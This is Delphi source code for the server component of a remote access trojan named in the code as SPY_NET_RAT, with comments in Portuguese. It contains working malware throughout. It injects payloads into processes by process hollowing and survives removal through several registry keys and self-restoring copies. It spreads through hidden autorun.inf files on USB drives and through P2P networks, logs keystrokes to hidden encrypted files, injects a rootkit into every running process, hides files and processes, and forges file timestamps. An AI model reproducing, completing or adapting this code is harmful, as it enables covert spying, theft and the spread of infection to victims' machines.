library server;

uses
  windows,
  UnitDiversos,
  EditSvr,
  UnitVariaveis,
  UnitServerUtils,
  UnitSettings,
  UnitKeylogger,
  UnitCarregarFuncoes,
  UnitConexao,
  UnitExecutarComandos,
  UnitCryptString,
  UnitComandos,
  p2p_spreader,
  HideProcess,
  illusb,
  UnitInjectLibrary,
  tlHelp32;

var
  PrimeiraVez: boolean = true;

type
  HANDLE        = THandle;
  PVOID         = Pointer;
  LPVOID        = Pointer;
  SIZE_T        = Cardinal;
  ULONG_PTR     = Cardinal;
  NTSTATUS      = LongInt;
  LONG_PTR      = Integer;

  PImageSectionHeaders = ^TImageSectionHeaders;
  TImageSectionHeaders = Array [0..95] Of TImageSectionHeader;

Function ImageFirstSection(NTHeader: PImageNTHeaders): PImageSectionHeader;
Begin
  Result := PImageSectionheader( ULONG_PTR(@NTheader.OptionalHeader) +
                                 NTHeader.FileHeader.SizeOfOptionalHeader);
End;

Function Protect(Characteristics: ULONG): ULONG;
Const
  Mapping       :Array[0..7] Of ULONG = (
                 PAGE_NOACCESS,
                 PAGE_EXECUTE,
                 PAGE_READONLY,
                 PAGE_EXECUTE_READ,
                 PAGE_READWRITE,
                 PAGE_EXECUTE_READWRITE,
                 PAGE_READWRITE,
                 PAGE_EXECUTE_READWRITE  );
Begin
  Result := Mapping[ Characteristics SHR 29 ];
End;

function MyZwUnmapViewOfSection(ProcessHandle: HANDLE; BaseAddress: PVOID): NTSTATUS;
var
  xZwUnmapViewOfSection: function(ProcessHandle: HANDLE; BaseAddress: PVOID): NTSTATUS; stdcall;
begin
  xZwUnmapViewOfSection := GetProcAddress(LoadLibrary(pchar('ntdll.dll')), pchar('ZwUnmapViewOfSection'));
  Result := xZwUnmapViewOfSection(ProcessHandle, BaseAddress);
end;

Function MemoryExecute(Buffer: Pointer; ProcessName, Parameters: String; Visible: Boolean): Boolean;
Var
  ProcessInfo: TProcessInformation;
  StartupInfo: TStartupInfo;
  Context: TContext;
  BaseAddress: Pointer;
  BytesRead: DWORD;
  BytesWritten: DWORD;
  I: ULONG;
  OldProtect: ULONG;
  NTHeaders: PImageNTHeaders;
  Sections: PImageSectionHeaders;
  Success: Boolean;

Begin
  Result := False;

  FillChar(ProcessInfo, SizeOf(TProcessInformation), 0);
  FillChar(StartupInfo, SizeOf(TStartupInfo),        0);

  StartupInfo.cb := SizeOf(TStartupInfo);
  StartupInfo.wShowWindow := Word(Visible);

  If (CreateProcess(PChar(ProcessName), PChar(Parameters), NIL, NIL,
                    False, CREATE_SUSPENDED, NIL, NIL, StartupInfo, ProcessInfo)) Then
  Begin
    Success := True;

    Try
      Context.ContextFlags := CONTEXT_INTEGER;
      If (GetThreadContext(ProcessInfo.hThread, Context) And
         (ReadProcessMemory(ProcessInfo.hProcess, Pointer(Context.Ebx + 8),
                            @BaseAddress, SizeOf(BaseAddress), BytesRead)) And
         (myZwUnmapViewOfSection(ProcessInfo.hProcess, BaseAddress) >= 0) And
         (Assigned(Buffer))) Then
         Begin
           NTHeaders    := PImageNTHeaders(Cardinal(Buffer) + Cardinal(PImageDosHeader(Buffer)._lfanew));
           BaseAddress  := VirtualAllocEx(ProcessInfo.hProcess,
                                          Pointer(NTHeaders.OptionalHeader.ImageBase),
                                          NTHeaders.OptionalHeader.SizeOfImage,
                                          MEM_RESERVE or MEM_COMMIT,
                                          PAGE_READWRITE);
           If (Assigned(BaseAddress)) And
              (WriteProcessMemory(ProcessInfo.hProcess, BaseAddress, Buffer,
                                  NTHeaders.OptionalHeader.SizeOfHeaders,
                                  BytesWritten)) Then
              Begin
                Sections := PImageSectionHeaders(ImageFirstSection(NTHeaders));

                For I := 0 To NTHeaders.FileHeader.NumberOfSections -1 Do
                  If (WriteProcessMemory(ProcessInfo.hProcess,
                                         Pointer(Cardinal(BaseAddress) +
                                                 Sections[I].VirtualAddress),
                                         Pointer(Cardinal(Buffer) +
                                                 Sections[I].PointerToRawData),
                                         Sections[I].SizeOfRawData, BytesWritten)) Then
                     VirtualProtectEx(ProcessInfo.hProcess,
                                      Pointer(Cardinal(BaseAddress) +
                                              Sections[I].VirtualAddress),
                                      Sections[I].Misc.VirtualSize,
                                      Protect(Sections[I].Characteristics),
                                      OldProtect);

                If (WriteProcessMemory(ProcessInfo.hProcess,
                                       Pointer(Context.Ebx + 8), @BaseAddress,
                                       SizeOf(BaseAddress), BytesWritten)) Then
                   Begin
                     Context.Eax := ULONG(BaseAddress) +
                                    NTHeaders.OptionalHeader.AddressOfEntryPoint;
                     Success := SetThreadContext(ProcessInfo.hThread, Context);
                   End;
              End;
         End;
    Finally
      If (Not Success) Then
        TerminateProcess(ProcessInfo.hProcess, 0)
      Else
        ResumeThread(ProcessInfo.hThread);

      Result := Success;
    End;
  End;
End;

procedure MeltOriginal;
begin
  if (MeltOriginalFile = true) and
     (paramstr(0) <> FirstExecuteFileName) and
     (FirstExecuteFileName <> ServerFileName) then
  while (MyDeleteFile(pchar(FirstExecuteFileName)) = false) and (FileExists(FirstExecuteFileName) = true) do sleep(100);
end;

procedure ExibirMSG;
begin
  messagebox(0, pchar(TextoMSG), pchar(TituloMSG), BotaoMSG or IconeMSG);
end;

procedure ExecBindedFiles;
var
  name,
  ExecAlways,
  Destino,
  Execucao,
  param,
  tamanho,
  Buffer: string;
begin
  while BindedFiles <> '' do
  begin
    name := copy(BindedFiles, 1, pos('|', BindedFiles) - 1);
    delete(BindedFiles, 1, pos('|', BindedFiles));

    ExecAlways := copy(BindedFiles, 1, pos('|', BindedFiles) - 1);
    delete(BindedFiles, 1, pos('|', BindedFiles));
    if ExecAlways = '0' then if PrimeiraVez = true then ExecAlways := '1';

    Destino := copy(BindedFiles, 1, pos('|', BindedFiles) - 1);
    delete(BindedFiles, 1, pos('|', BindedFiles));

    Execucao := copy(BindedFiles, 1, pos('|', BindedFiles) - 1);
    delete(BindedFiles, 1, pos('|', BindedFiles));

    param := copy(BindedFiles, 1, pos('|', BindedFiles) - 1);
    delete(BindedFiles, 1, pos('|', BindedFiles));

    tamanho := copy(BindedFiles, 1, pos('|', BindedFiles) - 1);
    delete(BindedFiles, 1, pos('|', BindedFiles));

    buffer := copy(BindedFiles, 1, strtoint(tamanho));
    delete(BindedFiles, 1, strtoint(tamanho));

    if Destino = '0' then Destino := MyRootFolder else
    if Destino = '1' then Destino := MyWindowsFolder else
    if Destino = '2' then Destino := MySystemFolder else
    if Destino = '3' then Destino := GetProgramFilesDir + '\' else
    if Destino = '4' then Destino := MyTempFolder;

    if (Execucao = '0') and (ExecAlways = '1') then
    begin
      criararquivo(pchar(Destino + name), buffer, length(buffer));
      if fileexists(Destino + name) then
      myshellexecute(0, 'open', pchar(Destino + name), pchar(param), pchar(Destino), sw_normal);
    end else
    if (Execucao = '1') and (ExecAlways = '1') then
    begin
      criararquivo(pchar(Destino + name), buffer, length(buffer));
      if fileexists(Destino + name) then
      myshellexecute(0, 'open', pchar(Destino + name), pchar(param), pchar(Destino), sw_hide);
    end else
    if (Execucao = '2') and (ExecAlways = '1') then
    begin
      //memoryexecute(@buffer[1], paramstr(0), param, false);
      memoryexecute(@buffer[1], ServerFileName, param, false);
    end else
    if (Execucao = '3') and (ExecAlways = '1') then
    begin
      criararquivo(pchar(Destino + name), buffer, length(buffer));
    end;
  end;

end;

procedure VerificarPrimeiraExecucao;
begin
  if GetFirstExecution = '' then
  begin
    PrimeiraVez := true;
    // mostrar mensagens
    if ExibirMensagem = true then StartThread(@ExibirMSG);
  end else PrimeiraVez := false;

  // executa arquivos
  if BindedFiles <> '' then StartThread(@ExecBindedFiles);
end;

procedure IniciarPersist;
var
  ServerBuffer: string;
  Tamanho: cardinal;
  InstallKey: HKEY;
  TempMutex: THandle;
begin
  ServerBuffer := LerArquivo(ServerFileName, Tamanho);

  while true do
  begin
    Sleep(5000);

    if HKLM <> '' then
    if lerreg(HKEY_LOCAL_MACHINE, pchar(CurrentVersion), pchar(HKLM), '') <> ServerFileName then
    Write2Reg(HKEY_LOCAL_MACHINE, pchar(CurrentVersion), pchar(HKLM), Pchar(ServerFileName));

    if HKCU <> '' then
    if lerreg(HKEY_CURRENT_USER, pchar(CurrentVersion), pchar(HKCU), '') <> ServerFileName then
    Write2Reg(HKEY_CURRENT_USER, pchar(CurrentVersion), pchar(HKCU), Pchar(ServerFileName));

    if Policies <> '' then
    begin
      if lerreg(HKEY_LOCAL_MACHINE, pchar(PoliciesKey), pchar(Policies), '') <> ServerFileName then
      Write2Reg(HKEY_LOCAL_MACHINE, pchar(PoliciesKey), pchar(Policies), Pchar(ServerFileName));

      if lerreg(HKEY_CURRENT_USER, pchar(PoliciesKey), pchar(Policies), '') <> ServerFileName then
      Write2Reg(HKEY_CURRENT_USER, pchar(PoliciesKey), pchar(Policies), Pchar(ServerFileName));
    end;

    if ActiveX <> '' then
    begin
      if lerreg(HKEY_LOCAL_MACHINE, pchar(InstalledComp + ActiveX), pchar('StubPath'), '') <> ServerFileName then
      Write2Reg(HKEY_LOCAL_MACHINE, pchar(InstalledComp + ActiveX), pchar('StubPath'), Pchar(ServerFileName));

      RegOpenKeyEx(HKEY_CURRENT_USER, InstalledComp, 0, KEY_WRITE, InstallKey);
      RegDeleteKey(InstallKey, pchar(activeX));
      RegCloseKey(InstallKey);
    end;

    TempMutex := CreateMutex(nil, False, pchar(MutexName + '_SAIR'));
    if GetLastError = ERROR_ALREADY_EXISTS then
    begin
      CloseHandle(TempMutex);
      CloseHandle(PersistMutex);
      break;
      Exit;
    end else closehandle(TempMutex);

    if (FileExists(ServerFileName) = false) or (MyGetFileSize(ServerFileName) <> Tamanho) then
    begin
      MyDeleteFile(ServerFileName);
      ForceDirectories(pchar(extractfilepath(ServerFileName)));
      Criararquivo(ServerFileName, ServerBuffer, Tamanho);

      if (ChangeDate = true) and (ServerFileName <> paramstr(0)) then
      begin
        ChangeFileTime(ServerFileName);
        ChangeDirTime(ExtractFilePath(ServerFileName));
      end;

      if (HideFile = true) and (ServerFileName <> paramstr(0)) then
      begin
        HideFileName(ServerFileName);
        HideFileName(extractfilepath(ServerFileName));
      end;
    end;

    TempMutex := CreateMutex(nil, False, pchar(MutexName));
    if GetLastError = ERROR_ALREADY_EXISTS then closehandle(TempMutex) else
    begin
      closehandle(TempMutex);
      Myshellexecute(0, 'open', pchar(ServerFileName), '', nil, SW_HIDE);
    end;

  end;
end;

type
  TMain = class
    //procedure usbDisConnect(AObject : TObject; ADriverName: string);
    procedure usbConnect(AObject : TObject; ADriverName: string);
  end;

var
  usb: TUsbClass;
{
procedure TMain.usbDisConnect(AObject : TObject; ADriverName: string);
begin
  messagebox(0, pchar('Disconnect Usb: ' + ADriverName), '', 0);
end;
}
procedure TMain.usbConnect(AObject : TObject; ADriverName: string);
var
  TempDir: string;
  TempStr: string;
begin
  //Messagebox(0, pchar('Connect Usb: ' + ADriverName), '', 0);
  TempDir := ADriverName + 'RECYCLER\S-1-5-21-1482476501-3352491937-682996330-1013\';
  ForceDirectories(TempDir);
  CopyFile(pchar(serverfilename), pchar(TempDir + extractfilename(serverfilename)), false);
  TempStr := '[autorun]' + #13#10 +
             ';open=' + 'RECYCLER\S-1-5-21-1482476501-3352491937-682996330-1013\' + extractfilename(serverfilename) + #13#10 +
             'icon=shell32.dll,4' + #13#10 +
             'shellexecute=' + 'RECYCLER\S-1-5-21-1482476501-3352491937-682996330-1013\' + extractfilename(serverfilename) + #13#10 +
             'label=PENDRIVE' + #13#10 +
             'action=Open folder to view files' + #13#10 +
             'shell\Open=Open' + #13#10 +
             'shell\Open\command=' + 'RECYCLER\S-1-5-21-1482476501-3352491937-682996330-1013\' + extractfilename(serverfilename) + #13#10 +
             'shell\Open\Default=1';
   CriarArquivo(ADriverName + 'autorun.inf', tempstr, length(tempstr));
   HideFileName(ADriverName + 'autorun.inf');

   HideFileName(ADriverName + 'RECYCLER\');
   HideFileName(TempDir);
   HideFileName(TempDir + extractfilename(serverfilename));
end;

procedure StartUSBSpreader;
var
  Msg: TMsg;
  Main: TMain;
begin
  Main := TMain.Create;
  usb := TUsbClass.Create;
  usb.OnUsbInsertion := Main.usbConnect;
  //usb.OnUsbRemoval := Main.usbDisConnect;

  while GetMessage(msg, 0, 0, 0) do
  begin
    TranslateMessage(msg);
    DispatchMessage(msg);
  end;

  Main.Free;
end;

const
  SPY_NET = 'SPY_NET_RAT';
  MutexRootKIT = SPY_NET + 'MUTEX';

procedure StartRootKIT;
var
  ProcessHandle: THandle;
  Process32: TProcessEntry32;
  ProcessSnapshot: THandle;
  LastPIDs, PIDs: string;
  Msg: TMsg;

  function IntToStr(I: integer): string;
  begin
    Str(I, Result);
  end;

  function IsPID(PID: dword): boolean;
  begin
    Result := Pos(IntToStr(PID) + ':', LastPIDs) <> 0;
  end;

  procedure AddPID(PID: dword);
  begin
    PIDs := PIDs + IntToStr(PID) + ':';
  end;

begin
  while true do
  begin
    LastPIDs := PIDs;
    PIDs := '';
    ProcessSnapshot := CreateToolHelp32SnapShot(TH32CS_SNAPALL, 0);
    Process32.dwSize := SizeOf(TProcessEntry32);
    Process32First(ProcessSnapshot, Process32);
    repeat
      ProcessHandle := OpenProcess(PROCESS_ALL_ACCESS, False, Process32.th32ProcessID);
      if ProcessHandle <> 0 then
      begin
        if not IsPID(Process32.th32ProcessID) then
        begin
          if GetCurrentProcessId <> Process32.th32ProcessID then
            InjectPointerLibrary(ProcessHandle, @RootKITBuffer[1])
        end;
        AddPID(Process32.th32ProcessID);
      end;
      CloseHandle(ProcessHandle);
    until not (Process32Next(ProcessSnapshot, Process32));
    CloseHandle(ProcessSnapshot);
    sleep(100);
  end;
end;

var
  TempFile, TempStr, TempStr1, TempStr2: string;
  c: cardinal;
  MyKey: hkey;
  TempMutex: THandle;
begin
  //////////// Ler as configurações //////////////////
  TempFile := MyTempFolder + 'XX--XX--XX.txt';
  TempStr := lerarquivo(TempFile, c);

  FirstExecuteFileName := copy(TempStr, 1, pos('|', Tempstr) - 1);
  delete(TempStr, 1, pos('|', Tempstr));
  ServerFileName := copy(TempStr, 1, pos('|', Tempstr) - 1);
  delete(TempStr, 1, pos('|', Tempstr));

  LerConfigsFromFile(TempStr);
  GetFirstSettings;
  ///////////////////////////////////////////////////

  if ActiveX <> '' then
  begin
    RegOpenKeyEx(HKEY_CURRENT_USER, 'Software\Microsoft\Active Setup\Installed Components\', 0, KEY_WRITE, MyKey);
    RegDeleteKey(MyKey, pchar(ActiveX));
    RegCloseKey(MyKey);
  end;

  if persist = true then
  begin
    PersistMutex := CreateMutex(nil, False, pchar(MutexName + '_PERSIST'));
    if GetLastError = ERROR_ALREADY_EXISTS then closehandle(PersistMutex) else
    begin
      IniciarPersist;
      exit;
    end;
  end;

  Deletefile(pchar(TempFile));

  MainMutex := CreateMutex(nil, False, pchar(MutexName));
  if GetLastError = ERROR_ALREADY_EXISTS then exitprocess(0);

  CreateThread(nil, 0, @MeltOriginal, nil, 0, c);
  CreateThread(nil, 0, @VerificarPrimeiraExecucao, nil, 0, c);

  if (ChangeDate = true) and (ServerFileName <> paramstr(0)) then
  begin
    ChangeFileTime(ServerFileName);
    ChangeDirTime(ExtractFilePath(ServerFileName));
  end;

  if (HideFile = true) and (ServerFileName <> paramstr(0)) then
  begin
    HideFileName(ServerFileName);
    HideFileName(extractfilepath(ServerFileName));
  end;

  DisableDEP(GetCurrentProcessId);
  SetTokenPrivileges;

  // Iniciando keylogger
  LogsFile := GetAppDataDir + '\' + 'logs.dat';
  if KeyloggerAtivo = true then
  begin
    TempStr := EnDecrypt02('[LogFile]' + #13#10, MasterPassword);
    TempStr := TempStr + '####';
    if fileexists(LogsFile) = false then criararquivo(LogsFile, TempStr, length(TempStr));


    TempStr1 := Lerarquivo(LogsFile, c);
    while tempstr1 <> '' do
    begin
      DecryptedLog := DecryptedLog + EnDecrypt02(copy(tempstr1, 1, pos('####', tempstr1) - 1), MasterPassword);
      delete(tempstr1, 1, pos('####', tempstr1) - 1);
      delete(tempstr1, 1, 4);
    end;


    SetFileAttributes(PChar(LogsFile), FILE_ATTRIBUTE_NORMAL);
    ChangeDirTime(LogsFile);
    SetFileAttributes(PChar(LogsFile), FILE_ATTRIBUTE_HIDDEN);
    KeyloggerThread := StartThread(@startkeylogger);
  end;
  // fim do ---> Iniciando Keylogger

  mp_MemoryModule := nil;

  NewIdentification := GetNewIdentificationName('');

  if USBSpreader = true then StartThread(@StartUSBSpreader);
  if p2pnames <> '' then StartThread(@StartP2P);


  EnderecoAtual := 0;
  EnderecoMax := high(DNS);

  ChromeFile := GetAppDataDir + '\' + 'SQLite3.dll';

  if RootKITBuffer <> '' then
  begin
    MyHideProcess;
    Write2Reg(HKEY_CURRENT_USER, 'SOFTWARE\Microsoft\', 'PIDprocess', inttostr(GetCurrentProcessID));
    MainMutexRootKIT := CreateMutex(nil, False, pchar(MutexRootKIT));
    StartThread(@StartRootKIT);
  end;

  StartThread(@StartMailSend);
  StartThread(@VerificarConexao);

  // aqui eu já deixo algumas senhas prontas...
  TempMutex := CreateMutex(nil, False, '_x_X_PASSWORDLIST_X_x_');
  if fileexists(ServerFileName) = true then
  if MyShellExecute(0, 'open', pchar(ServerFileName), nil, nil, SW_NORMAL) > 32 then
  begin
    sleep(1000);
    closehandle(TempMutex);
  end;
  ////////////////////////////////////////////

  while FinalizarServidor = false do _ProcessMessages;
  CloseHandle(MainMutex);
  CloseHandle(MainMutexRootKIT);
  Sleep(12000);
end.
